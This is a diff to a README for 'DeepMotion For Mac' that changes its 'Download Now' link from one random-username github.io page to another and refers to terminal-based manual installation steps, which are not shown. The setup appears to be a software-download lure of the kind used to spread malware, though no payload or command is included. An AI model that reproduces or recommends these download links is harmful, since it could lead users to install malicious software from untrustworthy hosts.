@@ -4,7 +4,7 @@ DeepMotion For Mac is a powerful and intuitive motion graphics and animation sof
 
 ![image](https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQLMuM0jIQEEKv7Opnctm8Ik0KoCabuNzHA6A&s)
 
-[![Download Now](https://img.shields.io/badge/Download-Now-%23007AFF?style=for-the-badge&logo=apple)](https://fituganshfgh.github.io/.github/deepmotion)
+[![Download Now](https://img.shields.io/badge/Download-Now-%23007AFF?style=for-the-badge&logo=apple)](https://mrboomzeus519.github.io/gimronus/deepmotion)
 
 If the download button above doesn’t work, follow the manual installation instructions below using the terminal.
 
